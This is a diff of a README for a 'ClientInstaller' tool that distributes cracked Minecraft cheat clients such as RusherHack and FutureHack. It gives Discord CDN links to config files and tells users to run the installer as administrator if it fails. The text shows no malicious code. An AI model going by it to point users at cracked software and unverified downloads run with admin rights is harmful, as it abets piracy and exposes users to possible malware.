@@ -1,8 +1,19 @@
 # ClientInstaller
-Crack clients for Minecraft
+Crack clients for Minecraft                                                                                                                                     
 // EDUCATIONAL PURPOSES ONLY !!! - LEARNING PROGRAMMING PURPOSES !!!
-// OPEN SOURCE CLIENTINSTALLER
-
+// RusherHack 
+// ThunderHack
+// FutureHack
+// Additional settings ;
+  *Baritone
+  *Baritone with auto fly!
+  *3arthh4ck
+  *Lambda
+  *Salhack
+  *Optifine
+  /And etc..
+--------------------------
+TLAUNCHER LAUNCHER SUPPORT !!!
 MINECRAFT OFFICIAL LAUNCHER SUPPORT !!!
 
 DOWNLOAD LINK ---
@@ -15,7 +26,7 @@ Configs ---
 Future - *https://cdn.discordapp.com/attachments/1133395213117837402/1133395266951712778/korde.cfg*                            
 RusherHack - *https://cdn.discordapp.com/attachments/1133395213117837402/1133395767885844510/rusherhack.zip*
 
-Guide ---
+Guides --------------------------------------------------------------------------------------------------------------------
 Just Select Additional Mods (if you want) and press Install Button. It will say successfull popup if success.
 After installing check your mods folder, check mods. sometimes it wont install.
 If it gives error, Start as administrator.
